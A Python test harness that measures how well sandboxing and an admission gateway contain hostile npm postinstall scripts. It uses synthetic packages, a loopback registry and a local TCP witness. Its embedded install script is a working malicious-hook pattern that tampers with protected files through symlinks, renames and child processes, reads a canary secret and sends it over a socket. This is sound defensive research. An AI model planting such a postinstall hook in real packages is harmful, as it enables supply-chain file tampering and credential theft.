#!/usr/bin/env python3
"""FL-PKG-01: synthetic npm installs, real OS effects, independent witnesses.

C executes offline under default-deny OS capabilities and publishes through the
installation broker. C_CURRENT optionally retains the original negative control.
No real credentials, external packages or hardware attestations are used.
"""

from __future__ import annotations

import argparse
import base64
from concurrent.futures import ThreadPoolExecutor
from dataclasses import asdict, dataclass
import hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import io
import json
import math
import os
from pathlib import Path
import platform
import shutil
import signal
import socketserver
import subprocess
import tarfile
import threading
import time
from urllib.parse import urlsplit
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from blake3 import blake3
from babylon60.install_policy import InstallAuthority, InstallBroker, InstallScope, confinement_profile, node_runtime


POLICIES = ("A", "B", "C")
REGISTRY_POLICIES = (*POLICIES, "C_CURRENT")
CLASSES = ("benign", "suspicious", "adversarial")
INITIAL = b"FL-PKG-SYNTHETIC-INITIAL\n"
TOKEN = "fl-pkg-synthetic-registry-only"

INSTALL_SCRIPT = r"""
const fs = require('node:fs');
const net = require('node:net');
const cp = require('node:child_process');
const path = require('node:path');
const fixture = require('./fixture.json');
const e = process.env;
const attempt = (f) => { try { f(); } catch (_) {} };
fs.writeFileSync(path.join(e.FL_WORK, 'legitimate.ok'), fixture.name);
if (fixture.kind !== 'benign') {
  const target = e.FL_PROTECTED;
  const value = 'FL-PKG-CONTROLLED-MUTATION';
  attempt(() => {
    switch (fixture.variant) {
      case 0: fs.writeFileSync(target, value); break;
      case 1: fs.appendFileSync(target, value); break;
      case 2:
        const staged = path.join(e.FL_WORK, 'staged');
        fs.writeFileSync(staged, value); fs.renameSync(staged, target); break;
      case 3:
        const link = path.join(e.FL_WORK, 'alias');
        fs.symlinkSync(target, link); fs.writeFileSync(link, value); break;
      case 4:
        cp.execFileSync(process.execPath, ['-e',
          'require("node:fs").writeFileSync(process.argv[1], process.argv[2])',
          target, value], {stdio: 'ignore'}); break;
    }
  });
  attempt(() => fs.writeFileSync(e.FL_UNLISTED, value));
  let payload = 'NO-CANARY-READ';
  attempt(() => {
    payload = fs.readFileSync(e.FL_SECRET, 'utf8');
    fs.writeFileSync(path.join(e.FL_WORK, 'canary-export'), payload);
  });
  const socket = net.connect({host: '127.0.0.1', port: Number(e.FL_SINK_PORT)});
  socket.setTimeout(1000);
  socket.on('connect', () => socket.end(e.FL_TRIAL + '\n' + payload));
  socket.on('timeout', () => socket.destroy());
  socket.on('error', () => socket.destroy());
}
"""


@dataclass(frozen=True)
class Package:
    name: str
    kind: str
    variant: int
    archive: bytes
    integrity: str

    @property
    def admitted(self) -> bool:
        # The synthetic gateway knows flagged artifacts, not their future effects.
        return self.kind != "suspicious"


@dataclass(frozen=True)
class Observation:
    trial: str
    policy: str
    package: str
    kind: str
    variant: int
    warmup: bool
    returncode: int
    duration_ms: float
    legitimate_success: bool
    protected_mutation: bool
    unlisted_mutation: bool
    secret_canary_exposure: bool
    network_egress: bool
    timed_out: bool
    stderr_tail: str
    admission_rejected: bool = False
    mediation_verified: bool = False
    committed_files: int = 0
    unmediated_install_effects: int | None = None
    confinement_blake3: str = ""
    commit_receipt: dict[str, object] | None = None

    @property
    def unauthorized(self) -> bool:
        return any(
            (self.protected_mutation, self.unlisted_mutation, self.secret_canary_exposure, self.network_egress)
        ) or bool(self.unmediated_install_effects)


def read_nofollow(path: Path) -> bytes:
    fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    with os.fdopen(fd, "rb") as stream:
        return stream.read()


def make_corpus(count: int) -> list[Package]:
    if count < 3 or count % 3:
        raise ValueError("count must be a positive multiple of three, at least three")
    packages = []
    for index in range(count):
        kind = CLASSES[index % 3]
        variant = (index // 3) % 5
        name = f"fl-pkg-{index:04d}-{kind}"
        manifest = {"name": name, "version": "1.0.0", "scripts": {"postinstall": "node install.cjs"}}
        files = {
            "package.json": json.dumps(manifest).encode(),
            "fixture.json": json.dumps({"name": name, "kind": kind, "variant": variant}).encode(),
            "install.cjs": INSTALL_SCRIPT.encode(),
        }
        buffer = io.BytesIO()
        # Uncompressed tar is accepted by npm and has deterministic bytes/mtime.
        with tarfile.open(fileobj=buffer, mode="w") as archive:
            for filename, content in files.items():
                info = tarfile.TarInfo(f"package/{filename}")
                info.size, info.mode, info.mtime = len(content), 0o644, 0
                archive.addfile(info, io.BytesIO(content))
        data = buffer.getvalue()
        # npm's SRI protocol requires SHA-512; BABYLON evidence uses BLAKE3.
        integrity = "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
        packages.append(Package(name, kind, variant, data, integrity))
    return packages


class Registry:
    """Loopback-only, token-protected test registry; not a GitHub service emulator."""

    def __init__(self, packages: list[Package]) -> None:
        self.packages = {p.name: p for p in packages}
        self.events: list[dict[str, str | int]] = []
        self.lock = threading.Lock()
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format: str, *args: object) -> None:
                pass

            def do_GET(self) -> None:
                if self.headers.get("Authorization") != f"Bearer {TOKEN}":
                    self.send_error(401)
                    return
                parts = urlsplit(self.path).path.strip("/").split("/")
                if len(parts) != 2 or parts[0] not in REGISTRY_POLICIES:
                    self.send_error(404)
                    return
                policy, filename = parts
                name = filename.removesuffix(".tar")
                package = owner.packages.get(name)
                if package is None:
                    self.send_error(404)
                    return
                status = 200 if policy == "A" or package.admitted else 403
                with owner.lock:
                    owner.events.append({"policy": policy, "package": name, "path": filename, "status": status})
                if status != 200:
                    self.send_error(status, "Synthetic admission policy: flagged artifact")
                    return
                if filename.endswith(".tar"):
                    content, mime = package.archive, "application/octet-stream"
                else:
                    version = {
                        "name": name,
                        "version": "1.0.0",
                        "dist": {"tarball": f"{owner.url}/{policy}/{name}.tar", "integrity": package.integrity},
                    }
                    content = json.dumps(
                        {"name": name, "dist-tags": {"latest": "1.0.0"}, "versions": {"1.0.0": version}}
                    ).encode()
                    mime = "application/json"
                self.send_response(200)
                self.send_header("Content-Type", mime)
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.server.daemon_threads = True
        self.url = f"http://127.0.0.1:{self.server.server_port}"
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()


class Sink:
    """Independent TCP witness. Receipt of bytes is evidence, installer logs are not."""

    def __init__(self) -> None:
        self.receipts: dict[str, bytes] = {}
        self.lock = threading.Lock()
        owner = self

        class Handler(socketserver.BaseRequestHandler):
            def handle(self) -> None:
                self.request.settimeout(3)
                chunks = bytearray()
                while len(chunks) < 4096:
                    chunk = self.request.recv(4096)
                    if not chunk:
                        break
                    chunks.extend(chunk)
                trial, separator, payload = bytes(chunks).partition(b"\n")
                if separator:
                    with owner.lock:
                        owner.receipts[trial.decode("ascii")] = payload

        self.server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        self.server.daemon_threads = True
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()


def install_one(
    root: Path,
    package: Package,
    policy: str,
    registry: Registry,
    sink: Sink,
    npm: str,
    node: str,
    warmup: bool = False,
) -> Observation:
    trial = f"{'warmup' if warmup else 'measured'}-{policy}-{package.name}"
    work = root / "work" / trial
    protected = root / "protected" / trial
    unlisted = root / "unlisted" / trial
    for directory in (work, protected, unlisted, work / "home", work / "tmp"):
        directory.mkdir(parents=True)
    victim, secret, escape = protected / "victim", protected / "canary", unlisted / "victim"
    canary = f"SYNTHETIC-CANARY-{trial}".encode()
    victim.write_bytes(INITIAL)
    escape.write_bytes(INITIAL)
    secret.write_bytes(canary)
    original_inode = victim.stat().st_ino
    original_escape_inode = escape.stat().st_ino
    start = time.perf_counter_ns()
    downloaded = b""
    mediation_verified = False
    committed_files = 0
    unmediated: int | None = None
    profile_hash = ""
    receipt_data: dict[str, object] | None = None
    if policy == "C":
        request = Request(f"{registry.url}/C/{package.name}.tar", headers={"Authorization": f"Bearer {TOKEN}"})
        try:
            with urlopen(request, timeout=5) as response:
                downloaded = response.read(len(package.archive) + 1)
        except HTTPError as error:
            if error.code != 403:
                raise
            return Observation(
                trial,
                policy,
                package.name,
                package.kind,
                package.variant,
                warmup,
                1,
                (time.perf_counter_ns() - start) / 1_000_000,
                False,
                False,
                False,
                False,
                False,
                False,
                "Admission rejected before installer dispatch",
                admission_rejected=True,
                mediation_verified=True,
                unmediated_install_effects=0,
            )
        if "sha512-" + base64.b64encode(hashlib.sha512(downloaded).digest()).decode() != package.integrity:
            raise ValueError("Downloaded artifact failed npm SRI verification")
        if blake3(downloaded).digest() != blake3(package.archive).digest():
            raise ValueError("Downloaded artifact failed admission digest verification")
        (work / "fixture.tar").write_bytes(downloaded)
    dependency = {package.name: "1.0.0"}
    (work / "package.json").write_text(
        json.dumps({"name": "fl-pkg-lab", "version": "1.0.0", "dependencies": dependency})
    )
    lock = {
        "name": "fl-pkg-lab",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"name": "fl-pkg-lab", "version": "1.0.0", "dependencies": dependency},
            f"node_modules/{package.name}": {
                "version": "1.0.0",
                "resolved": "file:fixture.tar" if policy == "C" else f"{registry.url}/{policy}/{package.name}.tar",
                "integrity": package.integrity,
                "hasInstallScript": True,
            },
        },
    }
    (work / "package-lock.json").write_text(json.dumps(lock))
    userconfig = work / ".npmrc"
    userconfig.write_text("" if policy == "C" else f"//127.0.0.1:{registry.server.server_port}/:_authToken={TOKEN}\n")
    env = {
        "PATH": f"{Path(node).parent}:/usr/bin:/bin:/usr/sbin:/sbin",
        "HOME": str(work / "home"),
        "TMPDIR": str(work / "tmp"),
        "LANG": "C.UTF-8",
        "CI": "true",
        "FL_WORK": str(work),
        "FL_PROTECTED": str(victim),
        "FL_UNLISTED": str(escape),
        "FL_SECRET": str(secret),
        "FL_TRIAL": trial,
        "FL_SINK_PORT": str(sink.port),
    }
    command = [
        npm,
        "ci",
        "--ignore-scripts=false",
        "--foreground-scripts",
        "--audit=false",
        "--fund=false",
        "--update-notifier=false",
        "--fetch-retries=0",
        "--fetch-timeout=5000",
        "--cache",
        str(work / "cache"),
        "--userconfig",
        str(userconfig),
        "--globalconfig",
        "/dev/null",
        "--registry",
        f"{registry.url}/{policy}/",
    ]
    if policy == "C_CURRENT":
        command = ["/usr/bin/sandbox-exec", "-f", str(root / "babylon-current.sb"), *command]
    if policy == "C":
        runtime = node_runtime(node, npm)
        profile = confinement_profile(work, runtime)
        profiles = root / "profiles"
        profiles.mkdir(exist_ok=True)
        profile_path = profiles / f"{trial}.sb"
        profile_path.write_text(profile)
        profile_hash = blake3(profile.encode()).hexdigest()
        env["PATH"] = f"{runtime.node.parent}:/usr/bin:/bin"
        env["OPENSSL_CONF"] = "/dev/null"
        command = [
            "/usr/bin/sandbox-exec",
            "-f",
            str(profile_path),
            str(runtime.node),
            str(runtime.npm_cli),
            *command[1:],
            "--offline",
        ]
    child = subprocess.Popen(
        command, cwd=work, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, start_new_session=True
    )
    timed_out = False
    try:
        stdout, stderr = child.communicate(timeout=20)
    except subprocess.TimeoutExpired:
        timed_out = True
        os.killpg(child.pid, signal.SIGKILL)
        stdout, stderr = child.communicate()
    finally:
        # Fixtures do not detach; kill any lingering descendants of this trial.
        try:
            os.killpg(child.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
    if policy == "C" and child.returncode == 0 and not timed_out:
        destination = root / "installed"
        destination.mkdir(exist_ok=True)
        broker_state = root / "broker" / trial
        broker_state.mkdir(parents=True, mode=0o700)
        broker = InstallBroker(broker_state, InstallAuthority(epoch=0, logical_tick=lambda: 1))
        scope = InstallScope(
            trial,
            blake3(downloaded).hexdigest(),
            work,
            destination,
            trial,
            ("node_modules", "legitimate.ok"),
            0,
            10,
        )
        permit = broker.authorize(scope, downloaded)
        receipt = broker.commit(permit)
        receipt_data = dict(asdict(receipt))
        # Independent filesystem witness: check every published file against receipts.
        actual: dict[str, str] = {}
        for folder, _, filenames in os.walk(destination / trial, followlinks=False):
            for filename in filenames:
                path = Path(folder) / filename
                actual[path.relative_to(destination / trial).as_posix()] = blake3(read_nofollow(path)).hexdigest()
        expected = dict(receipt.committed_files)
        unmediated = sum(actual.get(path) != digest for path, digest in expected.items()) + len(
            actual.keys() - expected.keys()
        )
        committed_files = len(actual)
        mediation_verified = actual == expected and bool(actual)
    duration = (time.perf_counter_ns() - start) / 1_000_000
    with sink.lock:
        payload = sink.receipts.get(trial)
    with registry.lock:
        admission_rejected = any(
            event["policy"] == policy and event["package"] == package.name and event["status"] == 403
            for event in registry.events
        )
    export = work / "canary-export"
    exported = read_nofollow(export) if export.exists() else b""
    legitimate = work / "legitimate.ok"
    return Observation(
        trial,
        policy,
        package.name,
        package.kind,
        package.variant,
        warmup,
        child.returncode,
        duration,
        child.returncode == 0 and legitimate.exists() and read_nofollow(legitimate) == package.name.encode(),
        read_nofollow(victim) != INITIAL or victim.stat().st_ino != original_inode,
        read_nofollow(escape) != INITIAL or escape.stat().st_ino != original_escape_inode,
        canary in exported or canary in stdout or canary in stderr or (payload is not None and canary in payload),
        payload is not None,
        timed_out,
        stderr.decode("utf-8", "replace")[-1200:],
        admission_rejected=admission_rejected,
        mediation_verified=mediation_verified,
        committed_files=committed_files,
        unmediated_install_effects=unmediated,
        confinement_blake3=profile_hash,
        commit_receipt=receipt_data,
    )


def summarize(rows: list[Observation]) -> dict[str, object]:
    measured = [r for r in rows if not r.warmup]
    metrics: dict[str, object] = {}
    for policy in REGISTRY_POLICIES:
        group = [r for r in measured if r.policy == policy]
        if not group:
            continue
        benign = [r for r in group if r.kind == "benign"]
        hostile = [r for r in group if r.kind != "benign" and (policy == "A" or r.kind == "adversarial")]
        attempted = [r.duration_ms for r in group if policy == "A" or r.kind != "suspicious"]
        latency = sorted(attempted)
        metrics[policy] = {
            "packages": len(group),
            "successful_installs": sum(r.legitimate_success for r in group),
            "legitimate_install_success": sum(r.legitimate_success for r in benign),
            "legitimate_install_count": len(benign),
            "false_rejection_rate": sum(not r.legitimate_success for r in benign) / len(benign) if benign else None,
            "install_latency_p99_ms": latency[math.ceil(0.99 * len(latency)) - 1] if latency else None,
            "latency_samples": len(latency),
            "unauthorized_file_mutations": sum(r.protected_mutation + r.unlisted_mutation for r in group),
            "protected_file_mutations": sum(r.protected_mutation for r in group),
            "unlisted_file_mutations": sum(r.unlisted_mutation for r in group),
            "unauthorized_network_egress": sum(r.network_egress for r in group),
            "secret_canary_exposures": sum(r.secret_canary_exposure for r in group),
            "policy_bypass_rate": sum(r.unauthorized for r in hostile) / len(hostile) if hostile else None,
            "policy_bypass_denominator": len(hostile),
            "timeouts": sum(r.timed_out for r in group),
            "admission_rejections": sum(r.admission_rejected for r in group),
            "committed_files": sum(r.committed_files for r in group),
        }
    controls = [r for r in measured if r.policy == "A" and r.kind != "benign"]
    controls_ok = bool(controls) and all(
        r.legitimate_success
        and r.protected_mutation
        and r.unlisted_mutation
        and r.network_egress
        and r.secret_canary_exposure
        for r in controls
    )
    c_rows = [r for r in measured if r.policy == "C"]
    falsified = any(r.unauthorized for r in c_rows)
    admitted = [r for r in c_rows if not r.admission_rejected]
    complete = bool(admitted) and all(r.mediation_verified and r.unmediated_install_effects == 0 for r in c_rows)
    complete = complete and all(r.legitimate_success for r in admitted)
    reference = {r.package for r in measured if r.policy == "A"}
    comparison_complete = bool(reference) and all(
        {r.package for r in measured if r.policy == p} == reference for p in POLICIES
    )
    supported = (
        complete
        and controls_ok
        and comparison_complete
        and any(r.kind == "adversarial" for r in admitted)
        and any(r.kind == "benign" for r in admitted)
    )
    unmediated = sum(r.unmediated_install_effects or 0 for r in c_rows) if complete else None
    return {
        "experiment": "FL-PKG-01",
        "verdict": "FALSIFIED" if falsified else "SUPPORTED_WITHIN_DOMAIN" if supported else "INCONCLUSIVE",
        "positive_controls_valid": controls_ok,
        "metrics": metrics,
        "unmediated_install_effects_C": unmediated,
        "complete_mediation_verified": complete,
        "comparison_complete": comparison_complete,
        "limits": [
            "C uses default-deny staging capabilities, offline execution and exact immutable file publication permits.",
            "Mediation evidence covers these OS scopes and independent commit witnesses, not a trace of every syscall.",
            "Corpus identities cover five write mechanisms and one TCP/read probe, not independent exploit families.",
            "Campaign network evidence covers one loopback TCP sink; other protocols require separate regressions.",
            "B is a synthetic admission gateway, not GitHub Package Firewall; no Enterprise account was tested.",
            "Only the trusted C fetch phase can reach the registry; installer descendants receive no network capabilities.",
            "Install p99 includes C download, execution and publication; warmup and intentional admission rejects are excluded.",
            "policy_bypass_rate is observed effect escape among admitted hostile fixtures, not an exhaustive evasion rate.",
            "No hardware attestation or production runtime certification is claimed.",
        ],
        "observations": [asdict(r) for r in rows],
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--lab-root", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--count", type=int, default=300)
    parser.add_argument("--workers", type=int, default=1)
    parser.add_argument(
        "--include-current", action="store_true", help="Also measure the old confinement as a negative control"
    )
    args = parser.parse_args()
    root = args.lab_root.absolute()
    if not 1 <= args.workers <= 6:
        parser.error("workers must be between 1 and 6")
    if platform.system() != "Darwin":
        parser.error("real macOS required; no simulated fallback")
    if not (root / "FL_PKG_SYNTHETIC_LAB").is_file():
        parser.error("lab marker missing; use a fresh isolated directory")
    profile = read_nofollow(root / "babylon-current.sb") if args.include_current else b""
    npm, node = shutil.which("npm"), shutil.which("node")
    if not npm or not node:
        parser.error("npm and node are required")
    node_runtime(node, npm)
    corpus = make_corpus(args.count)
    output = args.output.absolute()
    output.mkdir(parents=True, exist_ok=False)
    if profile:
        (output / "babylon-current.sb").write_bytes(profile)
    corpus_manifest = [
        {
            "name": p.name,
            "kind": p.kind,
            "variant": p.variant,
            "blake3": blake3(p.archive).hexdigest(),
            "npm_integrity": p.integrity,
        }
        for p in corpus
    ]
    (output / "corpus.json").write_text(json.dumps(corpus_manifest, indent=2) + "\n")
    registry, sink = Registry(corpus), Sink()
    registry.thread.start()
    sink.thread.start()
    rows: list[Observation] = []

    def execute(job: tuple[Package, str, bool]) -> Observation:
        package, policy, warmup = job
        return install_one(root, package, policy, registry, sink, npm, node, warmup)

    try:
        with (output / "observations.jsonl").open("x") as journal:
            for warmup, fixtures in ((True, corpus[:3]), (False, corpus)):
                policies = (*POLICIES, "C_CURRENT") if args.include_current else POLICIES
                jobs = [(package, policy, warmup) for package in fixtures for policy in policies]
                with ThreadPoolExecutor(max_workers=args.workers) as pool:
                    for row in pool.map(execute, jobs):
                        rows.append(row)
                        journal.write(json.dumps(asdict(row)) + "\n")
                        journal.flush()
                        if len(rows) % 90 == 0:
                            print(f"Observed {len(rows)} trials (including warmups)", flush=True)
            os.fsync(journal.fileno())
    finally:
        registry.close()
        sink.close()
    report = summarize(rows)
    report["profile_blake3"] = blake3(profile).hexdigest()
    report["source_blake3"] = blake3(read_nofollow(Path(__file__))).hexdigest()
    report["policy_source_blake3"] = blake3(read_nofollow(Path(confinement_profile.__code__.co_filename))).hexdigest()
    report["environment"] = {
        "concurrent_installs": args.workers,
        "platform": platform.platform(),
        "node": subprocess.check_output([node, "--version"], text=True).strip(),
        "npm": subprocess.check_output([npm, "--version"], text=True).strip(),
        "lab_root": str(root),
    }
    report["registry_events"] = registry.events
    report["network_receipts"] = {key: value.decode("ascii") for key, value in sink.receipts.items()}
    (output / "report.json").write_text(json.dumps(report, indent=2) + "\n")
    print(json.dumps({k: report[k] for k in ("verdict", "positive_controls_valid", "metrics")}, indent=2))
    return 0 if report["verdict"] == "SUPPORTED_WITHIN_DOMAIN" else 1 if report["verdict"] == "FALSIFIED" else 2


if __name__ == "__main__":
    raise SystemExit(main())
